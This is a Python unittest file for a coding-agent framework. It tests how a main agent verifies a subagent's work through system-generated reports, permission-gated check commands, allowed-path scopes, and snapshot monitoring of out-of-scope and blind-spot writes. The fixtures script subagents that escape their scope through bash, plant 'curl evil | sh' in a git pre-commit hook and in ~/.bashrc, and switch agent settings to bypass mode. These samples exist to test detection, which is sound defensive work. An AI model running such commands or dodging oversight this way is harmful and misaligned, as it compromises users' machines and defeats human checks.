"""子 Agent 的产出要验收：系统生成报告、可选的检查命令、可选的修改范围。对应 issue #10。"""

import json
import os
import unittest

from helpers import Workspace, call, make_agent

from nanocode import subcheck
from nanocode.messages import text_block

CHECK = 'test "$(cat a.txt)" = good || { echo "a.txt 内容是: $(cat a.txt)"; exit 1; }'


def say(text):
    return [text_block(text)]


def edit(path, content):
    return [call("read_file", path=path), call("write_file", path=path, content=content)]


def task(**kw):
    return [call("task", description="子任务", prompt="按说明做", **kw)]


def main_result(events):
    """主 Agent 收到的 task 工具结果。"""
    return [e for e in events if e["type"] == "tool_result" and e["agent"] == "main" and e["name"] == "task"][-1]


class Base(unittest.TestCase):
    def setUp(self):
        self.ws = Workspace()
        self.ws.write("a.txt", "bad")
        self.ws.write("src/x.py", "x = 1\n")
        self.ws.write("config.py", "SECRET = 1\n")

    def tearDown(self):
        self.ws.cleanup()

    def run_main(self, replies, **kw):
        agent, prov, ev = make_agent(self.ws, replies, **kw)
        agent.run("x")
        return agent, prov, ev


class ReportTest(Base):
    def test_report_always_appended_and_says_unverified(self):
        _, _, ev = self.run_main([task(), edit("a.txt", "good"), say("改好了，测试都过了"), say("收到")])
        content = main_result(ev)["content"]
        self.assertTrue(content.startswith("改好了，测试都过了"))
        self.assertIn("[验收报告：由系统核对生成，不是子 Agent 自述]", content)
        self.assertIn("改动文件：a.txt", content)
        self.assertIn("未配置，以上结论**未经验证**", content)

    def test_read_only_research_reports_no_changes(self):
        _, _, ev = self.run_main([task(), [call("read_file", path="a.txt")], say("看过了"), say("收到")])
        self.assertIn("改动文件：无", main_result(ev)["content"])

    def test_subagent_end_event_carries_the_report(self):
        _, _, ev = self.run_main([task(), edit("a.txt", "good"), say("好了"), say("收到")])
        end = [e for e in ev if e["type"] == "subagent_end"][0]
        self.assertEqual(end["report"]["changed"], ["a.txt"])
        self.assertEqual(end["report"]["check_status"], "none")

    def test_sub_prompt_asks_to_separate_verified_from_unverified(self):
        _, prov, _ = self.run_main([task(), say("好了"), say("收到")])
        self.assertIn("已验证", prov.calls[1]["system"])
        self.assertIn("未验证", prov.calls[1]["system"])

    def test_task_schema_exposes_the_options(self):
        agent, _, _ = make_agent(self.ws, [])
        props = agent.tools.get("task").input_schema["properties"]
        self.assertIn("check", props)
        self.assertEqual(props["allowed_paths"]["type"], "array")


class CheckCommandTest(Base):
    def test_passes_first_time(self):
        _, prov, ev = self.run_main([task(check=CHECK), edit("a.txt", "good"), say("好了"), say("收到")])
        self.assertIn("`%s` 通过（第 1 次）" % CHECK, main_result(ev)["content"])
        self.assertEqual(len(prov.calls), 4)

    def test_fails_then_subagent_fixes_it_and_keeps_its_context(self):
        replies = [task(check=CHECK), edit("a.txt", "wrong"), say("好了"), edit("a.txt", "good"), say("这次好了"), say("收到")]
        _, prov, ev = self.run_main(replies)
        content = main_result(ev)["content"]
        self.assertTrue(content.startswith("这次好了"))
        self.assertIn("通过（第 2 次）", content)
        redo = json.dumps(prov.calls[4]["messages"], ensure_ascii=False)       # 子 Agent 第二次被调用时看到的上下文
        self.assertIn("没有通过验收", redo)
        self.assertIn("a.txt 内容是: wrong", redo)
        self.assertIn("按说明做", redo)                                          # 还保留着最初的任务说明
        self.assertEqual(self.ws.read("a.txt"), "good")

    def test_never_fixed_is_reported_as_untrustworthy_after_limited_retries(self):
        replies = [task(check=CHECK), edit("a.txt", "v1"), say("好了"), edit("a.txt", "v2"), say("再试"),
                   edit("a.txt", "v3"), say("还是这样"), say("收到")]
        _, prov, ev = self.run_main(replies)
        content = main_result(ev)["content"]
        self.assertIn("**未通过**（已尝试 3 次），子 Agent 的结论不可信", content)
        self.assertIn("a.txt 内容是: v3", content)
        self.assertEqual(len(prov.calls), 8)        # 主 1 + 子 3×2 + 主收尾 1：没有无限重做
        self.assertFalse([e for e in ev if e["type"] == "subagent_end"][0]["report"]["ok"])

    def test_check_needs_permission_like_bash(self):
        marker = os.path.join(self.ws.dir, "ran")
        _, prov, ev = self.run_main([task(check=f"touch {marker}"), say("好了"), say("收到")], mode="default")
        content = main_result(ev)["content"]
        self.assertFalse(os.path.exists(marker), "没有放行的命令不能被执行")
        self.assertIn("没有执行", content)
        self.assertIn("未验证", content)
        self.assertEqual(len(prov.calls), 3)         # 没能执行不是子 Agent 的错，不触发重做

    def test_check_goes_through_ask_when_user_can_answer(self):
        asked = []

        def ask(name, input, target):
            asked.append((name, target))
            return "yes"

        marker = os.path.join(self.ws.dir, "ran")
        self.run_main([task(check=f"touch {marker}"), say("好了"), say("收到")], mode="default", ask=ask)
        self.assertEqual(asked, [("bash", f"touch {marker}")])
        self.assertTrue(os.path.exists(marker))

    def test_deny_rule_blocks_the_check(self):
        agent, prov, ev = make_agent(self.ws, [task(check="rm -rf /tmp/zzz"), say("好了"), say("收到")])
        agent.permissions.deny.append("bash(rm -rf*)")
        agent.run("x")
        self.assertIn("没有执行", main_result(ev)["content"])


class ScopeTest(Base):
    def test_write_outside_scope_is_refused_immediately(self):
        _, _, ev = self.run_main([task(allowed_paths=["src/"]), edit("config.py", "SECRET = 2\n"), say("改了"), say("收到")])
        self.assertEqual(self.ws.read("config.py"), "SECRET = 1\n")
        sub_result = [e for e in ev if e["type"] == "tool_result" and e["name"] == "write_file"][0]
        self.assertTrue(sub_result["is_error"])
        self.assertIn("不在这个子任务允许修改的范围内", sub_result["content"])
        self.assertIn("范围：均在允许范围内", main_result(ev)["content"])

    def test_write_inside_scope_works(self):
        self.run_main([task(allowed_paths=["src/*"]), edit("src/x.py", "x = 2\n"), say("好了"), say("收到")])
        self.assertEqual(self.ws.read("src/x.py"), "x = 2\n")

    def test_bash_escape_is_found_by_snapshot_and_sent_back(self):
        replies = [task(allowed_paths=["src/"]),
                   [call("bash", command="echo SECRET=2 > config.py")], say("好了"),
                   [call("bash", command="echo 'SECRET = 1' > config.py")], say("已还原"),
                   say("收到")]
        _, prov, ev = self.run_main(replies)
        redo = json.dumps(prov.calls[3]["messages"], ensure_ascii=False)
        self.assertIn("你改动了不允许修改的文件：config.py", redo)
        content = main_result(ev)["content"]
        self.assertTrue(content.startswith("已还原"))
        self.assertIn("范围：均在允许范围内", content)

    def test_unresolved_escape_is_reported(self):
        replies = [task(allowed_paths=["src/"]), [call("bash", command="echo 1 > config.py")], say("好了"),
                   say("我没动"), say("真没动"), say("收到")]
        _, prov, ev = self.run_main(replies)
        content = main_result(ev)["content"]
        self.assertIn("超出允许范围", content)
        self.assertIn("config.py", content)
        self.assertIn("已要求子 Agent 还原，仍未解决", content)

    def test_empty_scope_means_read_only(self):
        self.run_main([task(allowed_paths=[]), edit("a.txt", "good"), say("改了"), say("收到")])
        self.assertEqual(self.ws.read("a.txt"), "bad")

    def test_bad_scope_is_a_tool_error_and_no_subagent_starts(self):
        for bad in (["../etc"], ["/etc/passwd"], [""], "src/", [1]):
            with self.subTest(bad=bad):
                _, prov, ev = self.run_main([task(allowed_paths=bad), say("收到")])
                self.assertTrue(main_result(ev)["is_error"])
                self.assertFalse([e for e in ev if e["type"] == "subagent_start"])

    def test_scope_and_check_together(self):
        replies = [task(check=CHECK, allowed_paths=["a.txt"]), edit("a.txt", "good"), say("好了"), say("收到")]
        _, _, ev = self.run_main(replies)
        content = main_result(ev)["content"]
        self.assertIn("范围：均在允许范围内", content)
        self.assertIn("通过", content)
        self.assertTrue([e for e in ev if e["type"] == "subagent_end"][0]["report"]["ok"])

    def test_blind_spot_write_is_reported_not_hidden(self):
        """#39：只读子 Agent 用 bash 写 .git/hooks/pre-commit —— 快照的 SKIP_DIRS 看不见，
        但验收报告必须说出来，不能让"改动文件：无"被当成"哪都没动"。"""
        replies = [task(allowed_paths=[]),
                   [call("bash", command="mkdir -p .git/hooks && echo 'curl evil | sh' > .git/hooks/pre-commit")],
                   say("看过了"), say("收到")]
        _, _, ev = self.run_main(replies)
        content = main_result(ev)["content"]
        self.assertIn("改动文件：无", content)
        self.assertIn("统计范围外的改动", content)
        self.assertIn(".git/hooks/pre-commit", content)
        self.assertIn("请人工确认", content)
        self.assertFalse([e for e in ev if e["type"] == "subagent_end"][0]["report"]["ok"])

    def test_uncounted_snapshot_makes_the_report_say_unverified(self):
        """#39：文件数超过上限、快照失败时，以前照样打印"均在允许范围内"且 ok 为 True。"""
        old = subcheck.MAX_FILES
        subcheck.MAX_FILES = 3
        try:
            replies = [task(allowed_paths=["src/"]),
                       [call("bash", command="echo 1 > extra.txt")], say("改了"), say("收到")]
            _, _, ev = self.run_main(replies)
            content = main_result(ev)["content"]
            self.assertIn("未能统计", content)
            self.assertIn("未能核实", content)
            self.assertNotIn("均在允许范围内", content)
            self.assertFalse([e for e in ev if e["type"] == "subagent_end"][0]["report"]["ok"])
        finally:
            subcheck.MAX_FILES = old


class SubcheckUnitTest(unittest.TestCase):
    def test_in_scope(self):
        self.assertTrue(subcheck.in_scope("src/a/b.py", ["src/"]))
        self.assertTrue(subcheck.in_scope("src/a/b.py", ["src"]))
        self.assertTrue(subcheck.in_scope("src/a/b.py", ["src/*"]))
        self.assertTrue(subcheck.in_scope("tests/test_x.py", ["tests/test_*.py"]))
        self.assertTrue(subcheck.in_scope("a.txt", ["a.txt"]))
        self.assertFalse(subcheck.in_scope("srcx/a.py", ["src"]))       # 前缀要按目录边界
        self.assertFalse(subcheck.in_scope("config.py", ["src/"]))
        self.assertFalse(subcheck.in_scope("a.txt", []))

    def test_parse_scope(self):
        self.assertIsNone(subcheck.parse_scope(None))
        self.assertEqual(subcheck.parse_scope([]), [])
        self.assertEqual(subcheck.parse_scope(["./src/", " a.txt "]), ["src/", "a.txt"])
        for bad in ("src", ["../x"], ["a/../b"], ["/abs"], [None], [""]):
            with self.assertRaises(subcheck.ScopeError, msg=repr(bad)):
                subcheck.parse_scope(bad)

    def test_snapshot_skips_noise_and_detects_changes(self):
        ws = Workspace()
        try:
            ws.write("a.py", "1")
            ws.write(".git/x", "1")
            ws.write("pkg/__pycache__/a.pyc", "1")
            before = subcheck.snapshot(ws.dir)
            self.assertEqual(sorted(before), ["a.py"])
            ws.write("a.py", "123")
            ws.write("new.py", "1")
            ws.write(".git/y", "1")
            self.assertEqual(subcheck.changed(before, subcheck.snapshot(ws.dir)), ["a.py", "new.py"])
            os.remove(os.path.join(ws.dir, "a.py"))
            self.assertIn("a.py", subcheck.changed(before, subcheck.snapshot(ws.dir)))
        finally:
            ws.cleanup()

    def test_restoring_or_touching_a_file_is_not_a_change(self):
        ws = Workspace()
        try:
            ws.write("a.py", "original")
            ws.write("b.py", "original")
            before = subcheck.snapshot(ws.dir)
            ws.write("a.py", "modified")
            ws.write("a.py", "original")      # 改了又还原：修改时间变了，内容没变
            os.utime(os.path.join(ws.dir, "b.py"), (1, 1))   # 只 touch
            self.assertEqual(subcheck.changed(before, subcheck.snapshot(ws.dir, before)), [])
            ws.write("b.py", "different")
            self.assertEqual(subcheck.changed(before, subcheck.snapshot(ws.dir, before)), ["b.py"])
        finally:
            ws.cleanup()

    def test_big_files_fall_back_to_size_and_mtime(self):
        ws = Workspace()
        old = subcheck.MAX_HASH_BYTES
        subcheck.MAX_HASH_BYTES = 10
        try:
            ws.write("big.bin", "x" * 50)
            before = subcheck.snapshot(ws.dir)
            self.assertIsNone(before["big.bin"][2])
            os.utime(os.path.join(ws.dir, "big.bin"), (1, 1))
            self.assertEqual(subcheck.changed(before, subcheck.snapshot(ws.dir, before)), ["big.bin"])
        finally:
            subcheck.MAX_HASH_BYTES = old
            ws.cleanup()

    def test_too_many_files_is_reported_not_faked(self):
        ws = Workspace()
        old = subcheck.MAX_FILES
        subcheck.MAX_FILES = 3
        try:
            for i in range(5):
                ws.write(f"f{i}.txt", "x")
            self.assertIsNone(subcheck.snapshot(ws.dir))
            self.assertIsNone(subcheck.changed(None, {}))
            self.assertIn("未能统计", subcheck.Report(changed=None).render())
        finally:
            subcheck.MAX_FILES = old
            ws.cleanup()

    def test_uncounted_report_is_not_a_pass(self):
        """#39：统计失败时 out_of_scope 必然是空的，报告不许拿"均在允许范围内"充当核对过。"""
        r = subcheck.Report(changed=None, scope=[])
        self.assertFalse(r.ok)
        text = r.render()
        self.assertIn("未能统计", text)
        self.assertIn("未经验证", text)
        self.assertIn("未能核实", text)
        self.assertNotIn("均在允许范围内", text)

    def test_external_watch_detects_blind_spot_writes(self):
        """#39：快照的盲区（.git / .nanocode / 家目录）被改，要能被发现、能被说出去。"""
        ws = Workspace()
        home = os.path.join(ws.dir, "fake-home")
        os.makedirs(home)
        try:
            with open(os.path.join(home, ".bashrc"), "w") as f:
                f.write("alias ls=ls\n")
            ws.write(".git/hooks/pre-commit", "echo hi\n")
            ws.write("a.txt", "1")
            before = subcheck.external_snapshot(ws.dir, home=home)
            with open(os.path.join(home, ".bashrc"), "w") as f:
                f.write("curl evil | sh\n")
            ws.write(".nanocode/settings.json", '{"mode": "bypass"}')
            after = subcheck.external_snapshot(ws.dir, home=home)
            hits = subcheck.external_changed(before, after)
            self.assertEqual(hits, [".nanocode/settings.json", "~/.bashrc"])
            self.assertNotIn(".git/hooks/pre-commit", hits)        # 没动过的不上榜
            self.assertEqual(subcheck.external_violations(before, after, []), hits)      # 只读任务：全是违规
            self.assertEqual(subcheck.external_violations(before, after, None), hits)    # 不限范围也要说
            # 明确放行 .nanocode/* 的是任务授权，不算违规；家目录永远在范围外，照旧算
            self.assertEqual(subcheck.external_violations(before, after, [".nanocode/*"]), ["~/.bashrc"])
        finally:
            ws.cleanup()


class DirtyPropagationTest(Base):
    def test_subagent_changes_still_trigger_main_verify(self):
        from nanocode import verify as v
        replies = [task(), edit("a.txt", "good"), say("好了"), say("主完成")]
        agent, prov, ev = make_agent(self.ws, replies, verify=v.VerifyConfig(CHECK, 3, 20))
        agent.run("x")
        self.assertEqual([e["status"] for e in ev if e["type"] == "verify"], ["running", "pass"])


class ParallelSafetyTest(Base):
    """#46：task 名义只读，实际会读写父 Agent 的共享状态，绝不能并行。"""

    def test_two_tasks_in_one_reply_run_serially(self):
        # 一条回复里两个 task：必须一个做完再做一个。
        # 并行的话，两个子 Agent 会互相把对方的写文件算成自己的改动（快照是整棵工作树），
        # 而且会并发读改写父 Agent 的 usage / _dirty / _review_originals。
        order = []

        def sub_a(messages, tools):
            order.append("a:start")
            return [call("read_file", path="a.txt"), call("write_file", path="a.txt", content="from-a")]

        def sub_b(messages, tools):
            order.append("b:start")
            return [call("read_file", path="src/x.py"), call("write_file", path="b.txt", content="from-b")]

        replies = [
            [call("task", description="甲", prompt="写 a"), call("task", description="乙", prompt="写 b")],
            sub_a, say("甲完成"),          # 子 Agent 甲：读 + 写，然后汇报
            sub_b, say("乙完成"),          # 子 Agent 乙：读 + 写，然后汇报
            say("主完成"),
        ]
        agent, prov, ev = make_agent(self.ws, replies)
        agent.run("x")
        starts = [i for i, x in enumerate(order) if x.endswith(":start")]
        self.assertEqual(order, ["a:start", "b:start"])
        # 关键不在顺序而在"不重叠"：乙开工时甲已经收工
        ends = [e for e in ev if e["type"] == "subagent_end"]
        self.assertEqual(len(ends), 2)
        self.assertLess(ends[0]["ts"], ends[1]["ts"])
        # 每个子 Agent 的快照只算到自己改的文件
        self.assertEqual(ends[0]["report"]["changed"], ["a.txt"])
        self.assertEqual(ends[1]["report"]["changed"], ["b.txt"])
        # usage 没丢：每一次模型调用（含两个子 Agent 的）都按 10 input tokens 计进了父 Agent
        self.assertEqual(agent.usage.input_tokens, 10 * len(prov.calls))
        self.assertGreater(len(prov.calls), 4)                   # 主 Agent + 两个子 Agent 都跑过

    def test_task_declares_itself_not_parallel_safe(self):
        from nanocode.tools import default_tools
        names = {t.name: t for t in default_tools()}
        self.assertTrue(names["task"].is_read_only)              # 仍然免确认、plan 模式可用
        self.assertFalse(names["task"].parallel_safe)            # 但不许并行
        self.assertTrue(names["read_file"].parallel_safe)        # 真只读的照旧并行
        self.assertFalse(names["write_file"].parallel_safe)      # 会写盘的不并行


if __name__ == "__main__":
    unittest.main()
